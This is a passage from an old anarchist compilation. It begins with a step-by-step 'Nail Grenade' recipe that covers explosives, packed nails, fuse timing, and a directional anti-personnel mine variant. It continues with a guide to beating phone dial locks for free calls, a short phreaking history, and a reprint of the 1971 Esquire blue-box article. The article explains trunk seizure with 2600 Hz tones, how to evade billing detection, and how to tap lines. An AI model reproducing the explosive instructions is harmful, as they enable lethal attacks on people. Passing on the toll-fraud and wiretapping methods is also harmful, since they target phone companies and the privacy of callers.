the cap.

Expansion of the seeds will raise the metal disc until it contacts the 
screws and closes the circuit.

Nail Grenade                                       by the Jolly Roger

     Effective fragmentation grenades can be made from a block of tnt or 
other blasting explosive and nails.

Material Required:
-----------------

Block of TNT or other blasting explosive
Nails
Non-electric (military or improvised) blasting cap
Fuse Cord
Tape, string, wire, or glue

Procedure:
---------

1) If an explosive charge other than a standard TNT block is used, make a 
hole in the center of the charge for inserting the blasting cap. TNT can 
be drilled with relative safety. With plastic explosives, a hole can be 
made by pressing a round stick into the center of the charge. The hole 
should be deep enough that the blasting cap is totally within the 
explosive.
2) Tape, tie, or glue one or two rows of closely packed nails to the 
sides of the explosive block. Nails should completely cover the four 
surfaces of the block.
3) Place blasting cap on one end of the fuse cord and crimp with pliers.

NOTE: To find out how long the fuse cord should be, check the time it 
takes a known length to burn. If 12 inches (30 cm) burns for 30 seconds, 
a 10 second delay will require a 4 inch (10 cm) fuse.

4) Insert the blasting cap in the hole in the block of explosive. Tape or 
tie fuse cord securly in place so that it will not fall out when the 
grenade is thrown.

Alternate Use:
-------------

An effective directional anti-personnel mine can be made by placing nails 
on only one side of the explosive block. For this case, an electric 
blasting cap can be used.

Revised in '95 ACBIV,..........   -= Mondain =-Phone Dial Locks -- How to Beat'em      courtesy of Mondain

    Have you ever been in an office or somewhere and wanted to make a free phone
call but some asshole put a lock on the phone to prevent out-going calls? Fret
no more phellow phreake, for every system can be beaten with a little knowledge!

    There are two ways to beat this obstacle, first pick the lock, I don't have
the time to teach locksmithing so we go to the second method which takes 
advantage of telephone electronics.

    To be as simple as possibnle when you pick up the phone you complete a 
circuit known as a local loop. When you hang up you break the circuit.  When
you dial (pulse) it also breaks the circuit but not long enough to hang up! So 
you can "Push-dial."  To do this you >>> RAPIDLY <<< depress the switchhook.
For example, to dial an operator (and then give her the number you want to call)
>>> RAPIDLY <<< & >>> EVENLY <<< depress the switchhook 10 times.  To dial
634-1268, depress 6 X'S pause, then 3 X'S, pause, then 4X'S, etc.  It takes a
little practice but you'll get the hang of it.  Try  practicing with your own #
so you'll get a busy tone when right.  It'll also work on touch-tone(tm) since
a DTMF line will also accept pulse.  Also, never depress the switchhook for
more than a second or it'll hang up!

    Finally, remember that you have just as much right to that phone as the
asshole who put the lock on it!

A Short History of Phreaking             courtesy of Mondain

   Well now we know a little vocabulary, and now its into history, Phreak
history.  Back at MIT in 1964 arrived a student by the name of Stewart Nelson,
who was extremely interested in the telephone.  Before entering MIT, he had
built autodialers, cheese boxes, and many more gadgets.  But when he came to
MIT he became even more interested in "fone-hacking" as they called it.  After
a little while he naturally started using the PDP-1, the schools computer at
that time, and from there he decided that it would be interesting to see
whether the computer could generate the frequencies required for blue boxing.
The hackers at MIT were not interested in ripping off Ma Bell, but just
exploring the telephone network.  Stew (as he was called) wrote a program to
generate all the tones and set off into the vast network.
   Now there were more people phreaking than the ones at MIT.  Most people have
heard of Captain Crunch (No not the cereal), he also discovered how to take
rides through the fone system, with the aid of a small whistle found in a
cereal box (can we guess which one?).  By blowing this whistle, he generated
the magical 2600hz and into the mouthpiece it sailed, giving him complete
control over the system.  I have heard rumors that at one time he made about
1/4 of the calls coming out of San Francisco.  He got famous fast.  He made the
cover of people magazine and was interviewed several times (as you'll soon
see).  Well he finally got caught after a long adventurous career.  After he
was caught he was put in jail and was beaten up quite badly because he would
not teach other inmates how to box calls.  After getting out, he joined Apple
computer and is still out there somewhere.
   Then there was Joe the Whistler, blind form the day he was born.  He could
whistle a perfect 2600hz tone.  It was rumored phreaks used to call him to tune
their boxes.
   Well that was up to about 1970, then from 1970 to 1979, phreaking was mainly
done by college students, businessmen and anyone who knew enough about
electronics and the fone company to make a 555 Ic to generate those magic
tones.  Businessmen and a few college students mainly just blue box to get free
calls.  The others were still there, exploring 800#'s and the new ESS systems.
ESS posed a big problem for phreaks then and even a bigger one now.  ESS was
not widespread, but where it was, blue boxing was next to impossible except for
the most experienced phreak.  Today ESS is installed in almost all major cities
and blue boxing is getting harder and harder.
   1978 marked a change in phreaking, the Apple ][, now a computer that was
affordable, could be programmed, and could save all that precious work on a
cassette.  Then just a short while later came the Apple Cat modem.  With this
modem, generating all blue box tones was easy as writing a program to count
form one to ten (a little exaggerated).  Pretty soon programs that could
imitate an operator just as good as the real thing were hitting the community,
TSPS and Cat's Meow, are the standard now and are the best.
   1982-1986: LD services were starting to appear in mass numbers.  People now
had programs to hack LD services, telephone exchanges, and even passwords.  By
now many phreaks were getting extremely good and BBS's started to spring up
everywhere, each having many documentations on phreaking for the novice.  Then
it happened, the movie War Games was released and mass numbers of sixth grade
to all ages flocked to see it.  The problem wasn't that the movie was bad, it
was that now EVERYONE wanted to be a hacker/phreak.  Novices came out in such
mass numbers, that bulletin boards started to be busy 24 hours a day.  To this
day, they still have not recovered.  Other problems started to occur, novices
guessed easy passwords on large government computers and started to play
around...  Well it wasn't long before they were caught, I think that many
people remember the 414-hackers.  They were so stupid as to say "yes" when the
computer asked them whether they'd like to play games.  Well at least it takes
the heat off the real phreaks/hacker/krackers.

-A story so incredible it may even make you feel sorry for the phone company-

Printed in the October 1971 issue of Esquire Magazine.  If you happen to be in
a library and come across a collection of Esquire magazines, the October 1971
issue is the first issue printed in the smaller format.  The story begins on
page 116 with a picture of a blue box.
                                      --One Farad Cap, Atlantic Anarchist Guild


The Blue Box Is Introduced: Its Qualities Are Remarked

I am in the expensively furnished living room of Al Gilbertson (His real name
has been changed.), the creator of the "blue box." Gilbertson is holding one of
his shiny black-and-silver "blue boxes" comfortably in the palm of his hand,
pointing out the thirteen little red push buttons sticking up from the console.
He is dancing his fingers over the buttons, tapping out discordant beeping
electronic jingles.  He is trying to explain to me how his little blue box does
nothing less than place the entire telephone system of the world, satellites,
cables and all, at the service of the blue-box operator, free of charge.

"That's what it does.  Essentially it gives you the power of a super operator.
You seize a tandem with this top button," he presses the top button with his
index finger and the blue box emits a high-pitched cheep, "and like that" --
cheep goes the blue box again -- "you control the phone company's long-distance
switching systems from your cute little Princes phone or any old pay phone.
And you've got anonymity.  An operator has to operate from a definite location:
the phone company knows where she is and what she's doing.  But with your
beeper box, once you hop onto a trunk, say from a Holiday Inn 800 (toll-free)
number, they don't know where you are, or where you're coming from, they don't
know how you slipped into their lines and popped up in that 800 number.  They
don't even know anything illegal is going on.  And you can obscure your origins
through as many levels as you like.  You can call next door by way of White
Plains, then over to Liverpool by cable, and then back here by satellite.  You
can call yourself from one pay phone all the way around the world to a pay
phone next to you.  And you get your dime back too."

"And they can't trace the calls?  They can't charge you?"
"Not if you do it the right way.  But you'll find that the free-call thing
isn't really as exciting at first as the feeling of power you get from having
one of these babies in your hand.  I've watched people when they first get hold
of one of these things and start using it, and discover they can make
connections, set up crisscross and zigzag switching patterns back and forth
across the world.  They hardly talk to the people they finally reach.  They say
hello and start thinking of what kind of call to make next.  They go a little
crazy."  He looks down at the neat little package in his palm.  His fingers are
still dancing, tapping out beeper patterns.

"I think it's something to do with how small my models are.  There are lots of
blue boxes around, but mine are the smallest and most sophisticated
electronically.  I wish I could show you the prototype we made for our big
syndicate order."

He sighs.  "We had this order for a thousand beeper boxes from a syndicate
front man in Las Vegas.  They use them to place bets coast to coast, keep lines
open for hours, all of which can get expensive if you have to pay.  The deal
was a thousand blue boxes for $300 apiece. Before then we retailed them for
$1500 apiece, but $300,000 in one lump was hard to turn down.  We had a
manufacturing deal worked out in the Philippines.  Everything ready to go.
Anyway, the model I had ready for limited mass production was small enough to
fit inside a flip-top Marlboro box.  It had flush touch panels for a keyboard,
rather than these unsightly buttons, sticking out.  Looked just like a tiny
portable radio.  In fact, I had designed it with a tiny transistor receiver to
get one AM channel, so in case the law became suspicious the owner could switch
on the radio part, start snapping his fingers, and no one could tell anything
illegal was going on. I thought of everything for this model -- I had it lined
with a band of thermite which could be ignited by radio signal from a tiny
button transmitter on your belt, so it could be burned to ashes instantly in
case of a bust.  It was beautiful.  A beautiful little machine.  You should
have seen the faces on these syndicate guys when they came back after trying it
out.  They'd hold it in their palm like they never wanted to let it go, and
they'd say, 'I can't believe it.  I can't believe it.'  You probably won't
believe it until you try it."

The Blue Box Is Tested: Certain Connections Are Made

About eleven o'clock two nights later Fraser Lucey has a blue box in the palm
of his left hand and a phone in the palm of his right.  He is standing inside a
phone booth next to an isolated shut-down motel off Highway 1.  I am standing
outside the phone booth.

Fraser likes to show off his blue box for people.  Until a few weeks ago when
Pacific Telephone made a few arrests in his city, Fraser Lucey liked to bring
his blue box (This particular blue box, like most blue boxes, is not blue.
Blue boxes have come to be called "blue boxes" either because 1) The first blue
box ever confiscated by phone-company security men happened to be blue, or 2)
To distinguish them from "black boxes."  Black boxes are devices, usually a
resistor in series, which, when attached to home phones, allow all incoming
calls to be made without charge to one's caller.) to parties.  It never failed:
a few cheeps from his device and Fraser became the center of attention at the
very hippest of gatherings, playing phone tricks and doing request numbers for
hours.  He began to take orders for his manufacturer in Mexico.  He became a
dealer.

Fraser is cautious now about where he shows off his blue box.  But he never
gets tired of playing with it.  "It's like the first time every time," he tells
me.

Fraser puts a dime in the slot.  He listens for a tone and holds the receiver
up to my ear.  I hear the tone. Fraser begins describing, with a certain
practiced air, what he does while he does it. "I'm dialing an 800 number now.
Any 800 number will do.  It's toll free. Tonight I think I'll use the ----- (he
names a well-know rent-a-car company) 800 number.  Listen, It's ringing.  Here,
you hear it?  Now watch."  He places the blue box over the mouthpiece of the
phone so that the one silver and twelve black push buttons are facing up toward
me.  He presses the silver button -- the one at the top -- and I hear that
high-pitched beep. "That's 2600 cycles per second to be exact," says Lucey.
"Now, quick. listen."  He shoves the earpiece at me.  The ringing has vanished.
The line gives a slight hiccough, there is a sharp buzz, and then nothing but
soft white noise.

"We're home free now," Lucey tells me, taking back the phone and applying the
blue box to its mouthpiece once again.  "We're up on a tandem, into a
long-lines trunk.  Once you're up on a tandem, you can send yourself anywhere
you want to go."  He decides to check out London first.  He chooses a certain
pay phone located in Waterloo Station.  This particular pay phone is popular
with the phone-phreaks network because there are usually people walking by at
all hours who will pick it up and talk for a while.

He presses the lower left-hand corner button which is marked "KP" on the face
of the box. "That's Key Pulse.  It tells the tandem we're ready to give it
instructions.  First I'll punch out KP 182 START, which will slide us into the
overseas sender in White Plains."  I hear a neat clunk-cheep.  "I think we'll
head over to England by satellite. Cable is actually faster and the connection
is somewhat better, but I like going by satellite.  So I just punch out KP Zero
44.  The Zero is supposed to guarantee a satellite connection and 44 is the
country code for England.  Okay... we're there.  In Liverpool actually.  Now
all I have to do is punch out the London area code which is 1, and dial up the
pay phone.  Here, listen, I've got a ring now."

I hear the soft quick purr-purr of a London ring.  Then someone picks up the
phone.

"Hello," says the London voice.

"Hello.  Who's this?" Fraser asks.

"Hello.  There's actually nobody here.  I just picked this up while I was
passing by.  This is a public phone.  There's no one here to answer actually."

"Hello.  Don't hang up.  I'm calling from the United States."

"Oh.  What is the purpose of the call?  This is a public phone you know."

"Oh.  You know.  To check out, uh, to find out what's going on in London.  How
is it there?"

"Its five o'clock in the morning.  It's raining now."

"Oh.  Who are you?"

The London passerby turns out to be an R.A.F. enlistee on his way back to the
base in Lincolnshire, with a terrible hangover after a thirty-six-hour pass.
He and Fraser talk about the rain.  They agree that it's nicer when it's not
raining.  They say good-bye and Fraser hangs up.  His dime returns with a nice
clink.

"Isn't that far out," he says grinning at me.  "London, like that."

Fraser squeezes the little blue box affectionately in his palm.  "I told ya
this thing is for real.  Listen, if you don't mind I'm gonna try this girl I
know in Paris.  I usually give her a call around this time.  It freaks her out.
This time I'll use the ------ (a different rent-a-car company) 800 number and
we'll go by overseas cable, 133; 33 is the country code for France, the 1 sends
you by cable.  Okay, here we go.... Oh damn.  Busy.  Who could she be talking
to at this time?"

A state police car cruises slowly by the motel.  The car does not stop, but
Fraser gets nervous.  We hop back into his car and drive ten miles in the
opposite direction until we reach a Texaco station locked up for the night.  We
pull up to a phone booth by the tire pump. Fraser dashes inside and tries the
Paris number.  It is busy again.

"I don't understand who she could be talking to.  The circuits may be busy.
It's too bad I haven't learned how to tap into lines overseas with this thing
yet."

Fraser begins to phreak around, as the phone phreaks say.  He dials a leading
nationwide charge card's 800 number and punches out the tones that bring him
the time recording in Sydney, Australia.  He beeps up the weather recording in
Rome, in Italian of course.  He calls a friend in Boston and talks about a
certain over-the-counter stock they are into heavily.  He finds the Paris
number busy again.  He calls up "Dial a Disc" in London, and we listen to
Double Barrel by David and Ansil Collins, the number-one hit of the week in
London.  He calls up a dealer of another sort and talks in code.  He calls up
Joe Engressia, the original blind phone-phreak genius, and pays his respects.
There are other calls.  Finally Fraser gets through to his young lady in
Paris.

They both agree the circuits must have been busy, and criticize the Paris
telephone system.  At two-thirty in the morning Fraser hangs up, pockets his
dime, and drives off, steering with one hand, holding what he calls his "lovely
little blue box" in the other.

You Can Call Long Distance For Less Than You Think

"You see, a few years ago the phone company made one big mistake," Gilbertson
explains two days later in his apartment.  "They were careless enough to let
some technical journal publish the actual frequencies used to create all their
multi-frequency tones.  Just a theoretical article some Bell Telephone
Laboratories engineer was doing about switching theory, and he listed the tones
in passing.  At ----- (a well-known technical school) I had been fooling around
with phones for several years before I came across a copy of the journal in the
engineering library.  I ran back to the lab and it took maybe twelve hours from
the time I saw that article to put together the first working blue box.  It was
bigger and clumsier than this little baby, but it worked."

It's all there on public record in that technical journal written mainly by
Bell Lab people for other telephone engineers.  Or at least it was public.
"Just try and get a copy of that issue at some engineering-school library now.
Bell has had them all red-tagged and withdrawn from circulation," Gilbertson
tells me.

"But it's too late.  It's all public now.  And once they became public the
technology needed to create your own beeper device is within the range of any
twelve-year-old kid, any twelve-year-old blind kid as a matter of fact.  And he
can do it in less than the twelve hours it took us.  Blind kids do it all the
time.  They can't build anything as precise and compact as my beeper box, but
theirs can do anything mine can do."

"How?"

"Okay.  About twenty years ago A.T.&T. made a multi-billion-dollar decision to
operate its entire long-distance switching system on twelve electronically
generated combinations of twelve master tones. Those are the tones you
sometimes hear in the background after you've dialed a long-distance number.
They decided to use some very simple tones -- the tone for each number is just
two fixed single-frequency tones played simultaneously to create a certain beat
frequency.  Like 1300 cycles per second and 900 cycles per second played
together give you the tone for digit 5.  Now, what some of these phone phreaks
have done is get themselves access to an electric organ.  Any cheap family
home-entertainment organ.  Since the frequencies are public knowledge now --
one blind phone phreak has even had them recorded in one of the talking books
for the blind -- they just have to find the musical notes on the organ which
correspond to the phone tones.  Then they tape them.  For instance, to get Ma
Bell's tone for the number 1, you press down organ keys F~5 and A~5 (900 and
700 cycles per second) at the same time.  To produce the tone for 2 it's F~5
and C~6 (1100 and 700 c.p.s).  The phone phreaks circulate the whole list of
notes so there's no trial and error anymore."

He shows me a list of the rest of the phone numbers and the two electric organ
keys that produce them.

"Actually, you have to record these notes at 3 3/4 inches-per-second tape speed
and double it to 7 1/2 inches-per-second when you play them back, to get the
proper tones," he adds.

"So once you have all the tones recorded, how do you plug them into the phone
system?"

"Well, they take their organ and their cassette recorder, and start banging out
entire phone numbers in tones on the organ, including country codes, routing
instructions, 'KP' and 'Start' tones.  Or, if they don't have an organ, someone
in the phone-phreak network sends them a cassette with all the tones recorded,
with a voice saying 'Number one,' then you have the tone, 'Number two,' then
the tone and so on.  So with two cassette recorders they can put together a
series of phone numbers by switching back and forth from number to number. Any
idiot in the country with a cheap cassette recorder can make all the free calls
he wants."

"You mean you just hold the cassette recorder up the mouthpiece and switch in a
series of beeps you've recorded?  The phone thinks that anything that makes
these tones must be its own equipment?"

"Right.  As long as you get the frequency within thirty cycles per second of
the phone company's tones, the phone equipment thinks it hears its own voice
talking to it.  The original granddaddy phone phreak was this blind kid with
perfect pitch, Joe Engressia, who used to whistle into the phone.  An operator
could tell the difference between his whistle and the phone company's
electronic tone generator, but the phone company's switching circuit can't tell
them apart.  The bigger the phone company gets and the further away from human
operators it gets, the more vulnerable it becomes to all sorts of phone
phreaking."

A Guide for the Perplexed

"But wait a minute," I stop Gilbertson.  "If everything you do sounds like
phone-company equipment, why doesn't the phone company charge you for the call
the way it charges its own equipment?"

"Okay.  That's where the 2600-cycle tone comes in.  I better start from the
beginning."

The beginning he describes for me is a vision of the phone system of the
continent as thousands of webs, of long-line trunks radiating from each of the
hundreds of toll switching offices to the other toll switching offices.  Each
toll switching office is a hive compacted of thousands of long-distance tandems
constantly whistling and beeping to tandems in far-off toll switching offices.

The tandem is the key to the whole system.  Each tandem is a line with some
relays with the capability of signalling any other tandem in any other toll
switching office on the continent, either directly one-to-one or by programming
a roundabout route through several other tandems if all the direct routes are
busy.  For instance, if you want to call from New York to Los Angeles and
traffic is heavy on all direct trunks between the two cities, your tandem in
New York is programmed to try the next best route, which may send you down to a
tandem in New Orleans, then up to San Francisco, or down to a New Orleans
tandem, back to an Atlanta tandem, over to an Albuquerque tandem and finally up
to Los Angeles.

When a tandem is not being used, when it's sitting there waiting for someone to
make a long-distance call, it whistles.  One side of the tandem, the side
"facing" your home phone, whistles at 2600 cycles per second toward all the
home phones serviced by the exchange, telling them it is at their service,
should they be interested in making a long-distance call.  The other side of
the tandem is whistling 2600 c.p.s. into one or more long-distance trunk lines,
telling the rest of the phone system that it is neither sending nor receiving a
call through that trunk at the moment, that it has no use for that trunk at the
moment.

"When you dial a long-distance number the first thing that happens is that you
are hooked into a tandem.  A register comes up to the side of the tandem facing
away from you and presents that side with the number you dialed.  This sending
side of the tandem stops whistling 2600 into its trunk line.  When a tandem
stops the 2600 tone it has been sending through a trunk, the trunk is said to
be "seized," and is now ready to carry the number you have dialed -- converted
into multi-frequency beep tones -- to a tandem in the area code and central
office you want.

Now when a blue-box operator wants to make a call from New Orleans to New York
he starts by dialing the 800 number of a company which might happen to have its
headquarters in Los Angeles.  The sending side of the New Orleans tandem stops
sending 2600 out over the trunk to the central office in Los Angeles, thereby
seizing the trunk.  Your New Orleans tandem begins sending beep tones to a
tandem it has discovered idly whistling 2600 cycles in Los Angeles.  The
receiving end of that L.A. tandem is seized, stops whistling 2600, listens to
the beep tones which tell it which L.A. phone to ring, and starts ringing the
800 number.  Meanwhile a mark made in the New Orleans office accounting tape
notes that a call from your New Orleans phone to the 800 number in L.A. has
been initiated and gives the call a code number. Everything is routine so far.

But then the phone phreak presses his blue box to the mouthpiece and pushes the
2600-cycle button, sending 2600 out from the New Orleans tandem to the L.A.
tandem.  The L.A. tandem notices 2600 cycles are coming over the line again and
assumes that New Orleans has hung up because the trunk is whistling as if idle.
The L.A. tandem immediately ceases ringing the L.A. 800 number.  But as soon as
the phreak takes his finger off the 2600 button, the L.A. tandem assumes the
trunk is once again being used because the 2600 is gone, so it listens for a
new series of digit tones - to find out where it must send the call.

Thus the blue-box operator in New Orleans now is in touch with a tandem in L.A.
which is waiting like an obedient genie to be told what to do next.  The
blue-box owner then beeps out the ten digits of the New York number which tell
the L.A. tandem to relay a call to New York City.  Which it promptly does.  As
soon as your party picks up the phone in New York, the side of the New Orleans
tandem facing you stops sending 2600 cycles to you and stars carrying his voice
to you by way of the L.A. tandem.  A notation is made on the accounting tape
that the connection has been made on the 800 call which had been initiated and
noted earlier.  When you stop talking to New York a notation is made that the
800 call has ended.

At three the next morning, when the phone company's accounting computer starts
reading back over the master accounting tape for the past day, it records that
a call of a certain length of time was made from your New Orleans home to an
L.A. 800 number and, of course, the accounting computer has been trained to
ignore those toll-free 800 calls when compiling your monthly bill.

"All they can prove is that you made an 800 toll-free call," Gilbertson the
inventor concludes.  "Of course, if you're foolish enough to talk for two hours
on an 800 call, and they've installed one of their special anti-fraud computer
programs to watch out for such things, they may spot you and ask why you took
two hours talking to Army Recruiting's 800 number when you're 4-F.

But if you do it from a pay phone, they may discover something peculiar the
next day -- if they've got a blue-box hunting program in their computer -- but
you'll be a long time gone from the pay phone by then.  Using a pay phone is
almost guaranteed safe."

"What about the recent series of blue-box arrests all across the country -- New
York, Cleveland, and so on?" I asked.  "How were they caught so easily?"

"From what I can tell, they made one big mistake: they were seizing trunks
using an area code plus 555-1212 instead of an 800 number. Using 555 is easy to
detect because when you send multi-frequency beep tones of 555 you get a charge
for it on your tape and the accounting computer knows there's something wrong
when it tries to bill you for a two-hour call to Akron, Ohio, information, and
it drops a trouble card which goes right into the hands of the security agent
if they're looking for blue-box user.

"Whoever sold those guys their blue boxes didn't tell them how to use them
properly, which is fairly irresponsible.  And they were fairly stupid to use
them at home all the time.

"But what those arrests really mean is than an awful lot of blue boxes are
flooding into the country and that people are finding them so easy to make that
they know how to make them before they know how to use them.  Ma Bell is in
trouble."

And if a blue-box operator or a cassette-recorder phone phreak sticks to pay
phones and 800 numbers, the phone company can't stop them?

"Not unless they change their entire nationwide long-lines technology, which
will take them a few billion dollars and twenty years.  Right now they can't do
a thing.  They're screwed."

Captain Crunch Demonstrates His Famous Unit

There is an underground telephone network in this country.  Gilbertson
discovered it the very day news of his activities hit the papers. That evening
his phone began ringing.  Phone phreaks from Seattle, from Florida, from New
York, from San Jose, and from Los Angeles began calling him and telling him
about the phone-phreak network.  He'd get a call from a phone phreak who'd say
nothing but, "Hang up and call this number."

When he dialed the number he'd find himself tied into a conference of a dozen
phone phreaks arranged through a quirky switching station in British Columbia.
They identified themselves as phone phreaks, they demonstrated their homemade
blue boxes which they called "M-Fers" (for "multi-frequency," among other
things) for him, they talked shop about phone-phreak devices.  They let him in
on their secrets on the theory that if the phone company was after him he must
be trustworthy.  And, Gilbertson recalls, they stunned him with their technical
sophistication.

I ask him how to get in touch with the phone-phreak network.  He digs around
through a file of old schematics and comes up with about a dozen numbers in
three widely separated area codes.

"Those are the centers," he tells me.  Alongside some of the numbers he writes
in first names or nicknames: names like Captain Crunch, Dr. No, Frank Carson
(also a code word for a free call), Marty Freeman (code word for M-F device),
Peter Perpendicular Pimple, Alefnull, and The Cheshire Cat.  He makes checks
alongside the names of those among these top twelve who are blind.  There are
five checks.

I ask him who this Captain Crunch person is.

"Oh.  The Captain.  He's probably the most legendary phone phreak.  He calls
himself Captain Crunch after the notorious Cap'n Crunch 2600 whistle."
(Several years ago, Gilbertson explains, the makers of Cap'n Crunch breakfast
cereal offered a toy-whistle prize in every box as a treat for the Cap'n Crunch
set.  Somehow a phone phreak discovered that the toy whistle just happened to
produce a perfect 2600-cycle tone.  When the man who calls himself Captain
Crunch was transferred overseas to England with his Air Force unit, he would
receive scores of calls from his friends and "mute" them -- make them free of
charge to them -- by blowing his Cap'n Crunch whistle into his end.)
"Captain Crunch is one of the older phone phreaks," Gilbertson tells me.  "He's
an engineer who once got in a little trouble for fooling around with the phone,
but he can't stop.  Well, they guy drives across country in a Volkswagen van
with an entire switchboard and a computerized super-sophisticated M-F-er in the
back.  He'll pull up to a phone booth on a lonely highway somewhere, snake a
cable out of his bus, hook it onto the phone and sit for hours, days sometimes,
sending calls zipping back and forth across the country, all over the
world...."

Back at my motel, I dialed the number he gave me for "Captain Crunch" and asked
for G---- T-----, his real name, or at least the name he uses when he's not
dashing into a phone booth beeping out M-F tones faster than a speeding bullet
and zipping phantomlike through the phone company's long-distance lines.

When G---- T----- answered the phone and I told him I was preparing a story for
Esquire about phone phreaks, he became very indignant.

"I don't do that.  I don't do that anymore at all.  And if I do it, I do it for
one reason and one reason only.  I'm learning about a system.  The phone
company is a System.  A computer is a System, do you understand?  If I do what
I do, it is only to explore a system. Computers, systems, that's my bag.  The
phone company is nothing but a computer."

A tone of tightly restrained excitement enters the Captain's voice when he
starts talking about systems.  He begins to pronounce each syllable with the
hushed deliberation of an obscene caller.

"Ma Bell is a system I want to explore.  It's a beautiful system, you know, but
Ma Bell screwed up.  It's terrible because Ma Bell is such a beautiful system,
but she screwed up.  I learned how she screwed up from a couple of blind kids
who wanted me to build a device.  A certain device.  They said it could make
free calls.  I wasn't interested in free calls.  But when these blind kids told
me I could make calls into a computer, my eyes lit up.  I wanted to learn about
computers.  I wanted to learn about Ma Bell's computers.  So I build the little
device, but I built it wrong and Ma Bell found out.  Ma Bell can detect things
like that.  Ma Bell knows.  So I'm strictly rid of it now.  I don't do it.
Except for learning purposes."  He pauses. "So you want to write an article.
Are you paying for this call?  Hang up and call this number."  He gives me a
number in a area code a thousand miles away of his own.  I dial the number.

"Hello again.  This is Captain Crunch.  You are speaking to me on a toll-free
loop-around in Portland, Oregon.  Do you know what a toll-free loop around is?
I'll tell you.

He explains to me that almost every exchange in the country has open test
numbers which allow other exchanges to test their connections with it.  Most of
these numbers occur in consecutive pairs, such as 302 956-0041 and 302
956-0042.  Well, certain phone phreaks discovered that if two people from
anywhere in the country dial the two consecutive numbers they can talk together
just as if one had called the other's number, with no charge to either of them,
of course.

"Now our voice is looping around in a 4A switching machine up there in Canada,
zipping back down to me," the Captain tells me.  "My voice is looping around up
there and back down to you.  And it can't ever cost anyone money.  The phone
phreaks and I have compiled a list of many many of these numbers.  You would be
surprised if you saw the list.  I could show it to you.  But I won't.  I'm out
of that now.  I'm not out to screw Ma Bell.  I know better.  If I do anything
it's for the pure knowledge of the System.  You can learn to do fantastic
things.  Have you ever heard eight tandems stacked up?  Do you know the sound
of tandems stacking and unstacking?  Give me your phone number.  Okay. Hang up
now and wait a minute."

Slightly less than a minute later the phone rang and the Captain was on the
line, his voice sounding far more excited, almost aroused.

"I wanted to show you what it's like to stack up tandems.  To stack up
tandems." (Whenever the Captain says "stack up" it sounds as if he is licking
his lips.)

"How do you like the connection you're on now?" the Captain asks me. "It's a
raw tandem.  A raw tandem.  Ain't nothin' up to it but a tandem.  Now I'm going
to show you what it's like to stack up.  Blow off.  Land in a far away place.
To stack that tandem up, whip back and forth across the country a few times,
then shoot on up to Moscow.

"Listen," Captain Crunch continues.  "Listen.  I've got line tie on my
switchboard here, and I'm gonna let you hear me stack and unstack tandems.
Listen to this.  It's gonna blow your mind."

First I hear a super rapid-fire pulsing of the flutelike phone tones, then a
pause, then another popping burst of tones, then another, then another.  Each
burst is followed by a beep-kachink sound.

"We have now stacked up four tandems," said Captain Crunch, sounding somewhat
remote.  "That's four tandems stacked up.  Do you know what that means?  That
means I'm whipping back and forth, back and forth twice, across the country,
before coming to you.  I've been known to stack up twenty tandems at a time.
Now, just like I said, I'm going to shoot up to Moscow."

There is a new, longer series of beeper pulses over the line, a brief silence,
then a ring.

"Hello," answers a far-off voice.

"Hello.  Is this the American Embassy Moscow?"

"Yes, sir.  Who is this calling?" says the voice.

"Yes.  This is test board here in New York.  We're calling to check out the
circuits, see what kind of lines you've got.  Everything okay there in
Moscow?"

"Okay?"

"Well, yes, how are things there?"

"Oh.  Well, everything okay, I guess."

"Okay.  Thank you."

They hang up, leaving a confused series of beep-kachink sounds hanging in
mid-ether in the wake of the call before dissolving away.

The Captain is pleased.  "You believe me now, don't you?  Do you know what I'd
like to do?  I'd just like to call up your editor at Esquire and show him just
what it sounds like to stack and unstack tandems. I'll give him a show that
will blow his mind.  What's his number?

I ask the Captain what kind of device he was using to accomplish all his feats.
The Captain is pleased at the question.

"You could tell it was special, couldn't you?"  Ten pulses per second. That's
faster than the phone company's equipment.  Believe me, this unit is the most
famous unit in the country.  There is no other unit like it.  Believe me."

"Yes, I've heard about it.  Some other phone phreaks have told me about it."

"They have been referring to my, ahem, unit?  What is it they said? Just out of
curiosity, did they tell you it was a highly sophisticated computer-operated
unit, with acoustical coupling for receiving outputs and a switch-board with
multiple-line-tie capability?  Did they tell you that the frequency tolerance
is guaranteed to be not more than .05 percent?  The amplitude tolerance less
than .01 decibel?  Those pulses you heard were perfect.  They just come faster
than the phone company. Those were high-precision op-amps.  Op-amps are
instrumentation amplifiers designed for ultra-stable amplification, super-low
distortion and accurate frequency response.  Did they tell you it can operate
in temperatures from -55 degrees C to +125 degrees C?"

I admit that they did not tell me all that.

"I built it myself," the Captain goes on.  "If you were to go out and buy the
components from an industrial wholesaler it would cost you at least $1500.  I
once worked for a semiconductor company and all this didn't cost me a cent.  Do
you know what I mean?  Did they tell you about how I put a call completely
around the world?  I'll tell you how I did it.  I M-Fed Tokyo inward, who
connected me to India, India connected me to Greece, Greece connected me to
Pretoria, South Africa, South Africa connected me to South America, I went from
South America to London, I had a London operator connect me to a New York
operator, I had New York connect me to a California operator who rang the phone
next to me.  Needless to say I had to shout to hear myself.  But the echo was
far out.  Fantastic.  Delayed.  It was delayed twenty seconds, but I could hear
myself talk to myself."

"You mean you were speaking into the mouthpiece of one phone sending your voice
around the world into your ear through a phone on the other side of your head?"
I asked the Captain.  I had a vision of something vaguely autoerotic going on,
in a complex electronic way.

"That's right," said the Captain.  "I've also sent my voice around the world
one way, going east on one phone, and going west on the other, going through
cable one way, satellite the other, coming back together at the same time,
ringing the two phones simultaneously and picking them up and whipping my
voice both ways around the world back to me. Wow.  That was a mind blower."

"You mean you sit there with both phones on your ear and talk to yourself
around the world," I said incredulously.

"Yeah.  Um hum.  That's what I do.  I connect the phone together and sit there
and talk."

"What do you say?  What do you say to yourself when you're connected?"

"Oh, you know.  Hello test one two three," he says in a low-pitched voice.

"Hello test one two three," he replied to himself in a high-pitched voice.

"Hello test one two three," he repeats again, low-pitched.

"Hello test one two three," he replies, high-pitched.

"I sometimes do this: Hello Hello Hello Hello, Hello, hello," he trails off and
breaks into laughter.

Why Captain Crunch Hardly Ever Taps Phones Anymore

Using internal phone-company codes, phone phreaks have learned a simple method
for tapping phones.  Phone-company operators have in front of them a board that
holds verification jacks.  It allows them to plug into conversations in case of
emergency, to listen in to a line to determine if the line is busy or the
circuits are busy.  Phone phreaks have learned to beep out the codes which lead
them to a verification operator, tell the verification operator they are
switchmen from some other area code testing out verification trunks. Once the
operator hooks them into the verification trunk, they disappear into the board
for all practical purposes, slip unnoticed into any one of the 10,000 to
100,000 numbers in that central office without the verification operator
knowing what they're doing, and of course without the two parties to the
connection knowing there is a phantom listener present on their line.

Toward the end of my hour-long first conversation with him, I asked the Captain
if he ever tapped phones.

